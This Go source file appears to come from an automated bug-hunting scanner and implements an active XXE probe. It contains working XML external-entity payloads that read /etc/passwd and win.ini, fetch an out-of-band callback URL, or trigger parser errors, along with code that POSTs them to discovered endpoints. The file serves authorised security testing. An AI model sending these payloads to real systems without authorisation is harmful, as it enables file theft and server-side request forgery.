package scanner

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scope"
)

// xxeOASTPayloadTemplate is the XML document used when an OAST service is
// available. The placeholder %%CALLBACK%% is replaced with the callback URL
// before sending.  The entity fetches the callback URL so an out-of-band
// callback confirms the external entity was resolved.
const xxeOASTPayloadTemplate = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abh_xxe [
  <!ENTITY xxe SYSTEM "%%CALLBACK%%">
]>
<abh_probe>&xxe;</abh_probe>`

// xxePassivePayload is used when no OAST service is available. The entity
// points at a well-known local file (/etc/passwd). Detection relies on
// file-content signatures appearing in the response body (same detection
// logic as the path-traversal probe).
const xxePassivePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abh_xxe [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<abh_probe>&xxe;</abh_probe>`

// xxeWindowsPassivePayload targets Windows systems (win.ini).
const xxeWindowsPassivePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abh_xxe [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<abh_probe>&xxe;</abh_probe>`

// xxeErrorPayload triggers XML parse errors in parsers that process external
// entities but do not return content (error-based blind XXE). The entity
// embeds a file path in a parameter entity to provoke an error that may leak
// the file path or XML parser internals.
const xxeErrorPayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abh_xxe [
  <!ENTITY % abh_xxe_file SYSTEM "file:///abh_xxe_nonexistent_9z3x_probe">
  <!ENTITY % abh_xxe_eval "<!ENTITY &#x25; exfil SYSTEM 'file:///abh_xxe_nonexistent_9z3x_probe'>">
  %abh_xxe_eval;
  %exfil;
]>
<abh_probe>abh_xxe_test</abh_probe>`

// xxeXMLAcceptPaths are path suffixes or content-type patterns that suggest
// the endpoint parses XML. Probing non-XML endpoints wastes budget without
// producing signal.
var xxeXMLAcceptPaths = []string{
	"/api/xml", "/xml", "/upload", "/import", "/parse",
	"/convert", "/transform", "/document", "/doc", "/invoice",
	"/order", "/webhook", "/callback", "/soap", "/wsdl",
	"/api/v", // broad REST API prefixes sometimes accept XML
}

// xxeErrorSignatures are XML parser / XXE-related error strings that indicate
// an external entity was processed and an error occurred. Ordered from most
// specific to least specific so the first-match return in
// matchXXEErrorSignature always picks the most informative signature.
var xxeErrorSignatures = []string{
	// Specific parser/exception class names — highest confidence.
	"saxparseexception",
	"xmlparseexception",
	"xmlsyntaxerror",
	"expaterror",
	// Java / Spring / .NET class paths.
	"org.xml.sax",
	"javax.xml",
	"system.xml",
	"an unhandled exception",
	"xmlexception",
	// Entity/DTD resolution error phrases.
	"external entity",
	"entity not found",
	"cannot find dtd",
	"dtd is not allowed",
	"system identifier",
	// Generic XML parsing error strings (kept after specific ones).
	"xml parsing error",
	"xml parse error",
	// Python lxml / expat (less specific, kept last).
}

// xxeMaxAttempts caps the probe budget.
const xxeMaxAttempts = 8

// runActiveXXEProbe is an active XML External Entity (XXE) injection scanner.
// It sends a crafted XML document with an external entity declaration to
// endpoints that appear to accept XML, then checks for:
//
//   - Out-of-band callback (when OAST is configured) — confirms blind XXE.
//   - File-content signatures (/etc/passwd, Windows win.ini) in the response
//     body — confirms reflected XXE.
//   - XML parser / entity-resolution error strings — confirms error-based
//     blind XXE.
//
// Only endpoints that look like XML consumers are probed (path heuristic +
// any Content-Type: application/xml or text/xml response headers from the
// baseline request). This keeps the probe budget focused.
func (s *Service) runActiveXXEProbe(ctx context.Context, input RunInput, body string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := s.collectXXECandidates(ctx, input, body)
	if len(candidates) == 0 {
		return nil
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("active-xxe %s", input.Target),
			Message: "Probing XML-accepting endpoints for XXE via external entity payloads",
		})
	}

	type hit struct {
		url       string
		technique string
		evidence  string
		payload   string
		signal    string
		header    http.Header
	}

	var hits []hit
	// Each phase uses its own attempt counter so earlier phases exhausting
	// their budget do not prevent later phases from running.
	oastAttempts := 0
	reflectedAttempts := 0
	errorAttempts := 0

	// ── OAST out-of-band XXE ─────────────────────────────────────────────────
	if s.oast != nil && s.oast.Configured() {
		tok := s.oast.Issue("", "xxe-probe")
		if tok.CallbackURL != "" {
			oastPayload := strings.ReplaceAll(xxeOASTPayloadTemplate, "%%CALLBACK%%", tok.CallbackURL)
			// Track which endpoints actually received the probe so the
			// evidence URL can point at the real triggering endpoint rather
			// than always using candidates[0].
			var probedEndpoints []string
			for _, ep := range candidates {
				if oastAttempts >= xxeMaxAttempts {
					break
				}
				if !scope.IsURLInScope(ep, input.Scope) {
					continue
				}
				req, err := http.NewRequestWithContext(
					ctx, http.MethodPost, ep,
					bytes.NewBufferString(oastPayload),
				)
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", "application/xml")
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				oastAttempts++
				// Phase 2 coverage accounting: record this probe key so the
				// surface-gap detector subtracts it from the inventory.
				RecordProbedKey(http.MethodPost, ep, "")
				probedEndpoints = append(probedEndpoints, ep)
				if err == nil && resp != nil {
					_ = resp.Body.Close()
				}
			}
			if oastHits := s.oast.Wait(tok.Token, defaultOASTSSRFWait); len(oastHits) > 0 {
				h := oastHits[0]
				// Use the first probed endpoint as a best-effort URL; we
				// cannot know which endpoint caused the callback without
				// per-request tokens, but recording all probed endpoints in
				// the evidence makes the finding actionable.
				triggerURL := ""
				if len(probedEndpoints) > 0 {
					triggerURL = probedEndpoints[0]
				}
				hits = append(hits, hit{
					url:       triggerURL,
					technique: "oast-out-of-band",
					payload:   oastPayload,
					evidence: fmt.Sprintf(
						"Inbound %s %s from %s at %s — XML parser resolved the external entity and fetched the OAST callback URL %s (probed endpoints: %s)",
						h.Method, h.Path, h.RemoteAddr,
						h.ReceivedAt.UTC().Format("2006-01-02T15:04:05Z"),
						tok.CallbackURL,
						strings.Join(limitStrings(probedEndpoints, 4), ", "),
					),
				})
			}
		}
	}

	// ── Reflected file-read XXE ──────────────────────────────────────────────
	if len(hits) == 0 {
		for _, payload := range []string{xxePassivePayload, xxeWindowsPassivePayload} {
			if len(hits) > 0 {
				break
			}
			for _, ep := range candidates {
				if reflectedAttempts >= xxeMaxAttempts {
					break
				}
				if !scope.IsURLInScope(ep, input.Scope) {
					continue
				}
				req, err := http.NewRequestWithContext(
					ctx, http.MethodPost, ep,
					bytes.NewBufferString(payload),
				)
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", "application/xml")
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				reflectedAttempts++
				RecordProbedKey(http.MethodPost, ep, "")
				if err != nil || resp == nil {
					continue
				}
				respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
				respHeader := resp.Header
				_ = resp.Body.Close()
				if !IsXMLShape(respHeader) {
					continue
				}
				if sig, matched := matchPathTraversalSignature(string(respBody)); matched {
					hits = append(hits, hit{
						url:       ep,
						technique: "reflected-file-read",
						evidence:  fmt.Sprintf("filesystem file content %q observed in response", sig),
						payload:   payload,
						signal:    sig,
						header:    respHeader,
					})
					break
				}
			}
		}
	}

	// ── Error-based blind XXE ────────────────────────────────────────────────
	if len(hits) == 0 {
		for _, ep := range candidates {
			if errorAttempts >= xxeMaxAttempts {
				break
			}
			if !scope.IsURLInScope(ep, input.Scope) {
				continue
			}
			req, err := http.NewRequestWithContext(
				ctx, http.MethodPost, ep,
				bytes.NewBufferString(xxeErrorPayload),
			)
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/xml")
			ApplyAuthProfile(req, input.AuthProfile)
			resp, err := s.doRequestWithRetry(ctx, req, input.Options)
			errorAttempts++
			RecordProbedKey(http.MethodPost, ep, "")
			if err != nil || resp == nil {
				continue
			}
			respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
			respHeader := resp.Header
			_ = resp.Body.Close()
			if !IsXMLShape(respHeader) {
				continue
			}
			if sig := matchXXEErrorSignature(string(respBody)); sig != "" {
				hits = append(hits, hit{
					url:       ep,
					technique: "error-based",
					evidence:  fmt.Sprintf("XML parser error signature %q observed in response", sig),
					payload:   xxeErrorPayload,
					signal:    sig,
					header:    respHeader,
				})
				break
			}
		}
	}

	if len(hits) == 0 {
		return nil
	}

	first := hits[0]
	curl := buildCurlReproducer(http.MethodPost, first.url, input.AuthProfile, "application/xml", xxePassivePayload)
	steps := []string{
		fmt.Sprintf("Send a POST to %s with Content-Type: application/xml and the following body:", first.url),
		xxePassivePayload,
		"Observe the response for filesystem file content (/etc/passwd), or monitor an OAST listener for an inbound HTTP request confirming the parser fetched an external URL.",
		"Escalate using a parameter entity exfiltration chain to read arbitrary files or interact with internal network services.",
	}

	var diffOutcome DifferentialReVerifyOutcome
	if first.technique != "oast-out-of-band" {
		baselines, berr := CaptureTwoControlBaselines(ctx, func(bctx context.Context) (BaselineSample, error) {
			return phase1POSTSample(bctx, s, first.url, "application/xml", `<?xml version="1.0"?><abh_probe>safe</abh_probe>`, input, 256*1024)
		})
		if berr == nil && phase1BaselineContains(baselines, first.signal) {
			return nil
		}
		diffOutcome = DifferentialReVerify(ctx, DifferentialReVerifyInput{
			ProbeName:       "active-xxe",
			OriginalPayload: first.payload,
			SafePayload:     `<?xml version="1.0"?><abh_probe>safe</abh_probe>`,
			Exec: func(dctx context.Context, altPayload string) (*http.Response, []byte, error) {
				req, err := http.NewRequestWithContext(dctx, http.MethodPost, first.url, strings.NewReader(altPayload))
				if err != nil {
					return nil, nil, err
				}
				req.Header.Set("Content-Type", "application/xml")
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(dctx, req, input.Options)
				if err != nil || resp == nil {
					return nil, nil, err
				}
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
				return resp, body, nil
			},
			Oracle: func(_ context.Context, _ string, _ *http.Response, body []byte) (bool, error) {
				if first.technique == "reflected-file-read" {
					_, matched := matchPathTraversalSignature(string(body))
					return matched, nil
				}
				return matchXXEErrorSignature(string(body)) != "", nil
			},
		})
		if diffOutcome.Ran && !diffOutcome.Confirmed {
			return nil
		}
	}

	finding := model.Finding{
		ID:                "active-xxe",
		Category:          "input-validation",
		Severity:          model.SeverityHigh,
		Title:             "XML External Entity (XXE) injection: external entity processed by XML parser",
		Description:       "The XML parser accepted an external entity declaration and either resolved the entity to a local file (returning its contents in the response) or made an out-of-band network request to an attacker-controlled URL. XXE enables arbitrary local file read (source code, /etc/passwd, application secrets), server-side request forgery against internal services, and in some configurations remote code execution.",
		Evidence:          first.evidence,
		Recommendation:    "Disable external entity processing in your XML parser (DocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false) in Java; LIBXML_NONET in PHP; defusedxml in Python; set ProhibitDtd=true in .NET). If DTD processing must be allowed, use a strict schema-validation step before further processing. Prefer JSON over XML where possible.",
		Confidence:        0.9,
		AffectedURL:       first.url,
		CWE:               "CWE-611",
		OWASPCategory:     "A05:2021 - Security Misconfiguration",
		Sources:           []string{"active-scanner"},
		ReproductionSteps: steps,
		PoC:               curl,
		EvidenceFields: map[string]string{
			"validationType": "active-probe",
			"technique":      first.technique,
			"evidenceDetail": first.evidence,
			"reproStep":      "POST the XXE payload with Content-Type: application/xml and observe file content or OAST callback",
			"curlReproducer": curl,
			"responseShape":  ClassifyResponseShape(first.header).String(),
		},
	}
	AttachDifferentialEvidence(&finding, diffOutcome)
	signals := []EvidenceSignal{EvidenceReflection, EvidenceSinkObserved, EvidenceBodyDelta}
	if first.technique == "oast-out-of-band" {
		signals = []EvidenceSignal{EvidenceOASTHit, EvidenceSinkObserved}
	} else if first.technique == "error-based" {
		signals = append(signals, EvidenceErrorSignal)
	}
	emitted, ok := phase1SubmitVerified(ctx, finding, "xxe", signals, "active-xxe")
	if !ok {
		return nil
	}
	return []model.Finding{emitted}
}

// collectXXECandidates returns candidate POST URLs for the XXE probe. It
// starts with endpoints discovered from runtime surface analysis that match
// XML-accepting path heuristics, then falls back to the primary target.
func (s *Service) collectXXECandidates(ctx context.Context, input RunInput, body string) []string {
	all := extractRuntimeEndpoints(input.Target, body, input.Scope, 12)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		all = append(all, input.Options.SeedRuntimeEndpoints...)
	}
	// Always include the primary target.
	all = append(all, input.Target)
	all = uniqueEndpoints(all)

	var xmlLike []string
	var rest []string
	for _, ep := range all {
		if isLikelyXMLEndpoint(ep) {
			xmlLike = append(xmlLike, ep)
		} else {
			rest = append(rest, ep)
		}
	}

	// Probe XML-looking endpoints first, then fall back to a small slice of
	// others — some REST APIs serve XML via Accept header negotiation even
	// though their paths look generic.
	var candidates []string
	candidates = append(candidates, xmlLike...)
	remaining := xxeMaxAttempts - len(candidates)
	if remaining > 0 && len(rest) > 0 {
		if len(rest) > remaining {
			rest = rest[:remaining]
		}
		candidates = append(candidates, rest...)
	}

	// Probe the bare target URL against common XML endpoint paths.
	base, err := url.Parse(strings.TrimSpace(input.Target))
	if err == nil && base.Scheme != "" && base.Host != "" {
		for _, p := range xxeXMLAcceptPaths {
			candidate := base.Scheme + "://" + base.Host + p
			if scope.IsURLInScope(candidate, input.Scope) {
				candidates = append(candidates, candidate)
			}
		}
	}

	return uniqueEndpoints(candidates)
}

// isLikelyXMLEndpoint returns true when the URL path suggests the endpoint
// accepts or processes XML.
func isLikelyXMLEndpoint(rawURL string) bool {
	lower := strings.ToLower(rawURL)
	for _, keyword := range []string{"xml", "soap", "wsdl", "xsd", "xslt", "rss", "atom", "import", "transform"} {
		if strings.Contains(lower, keyword) {
			return true
		}
	}
	return false
}

// matchXXEErrorSignature returns the first XML-parser error substring found
// in the response body (case-insensitive), or "" when none match.
func matchXXEErrorSignature(body string) string {
	if body == "" {
		return ""
	}
	lower := strings.ToLower(body)
	for _, sig := range xxeErrorSignatures {
		if strings.Contains(lower, sig) {
			return sig
		}
	}
	return ""
}
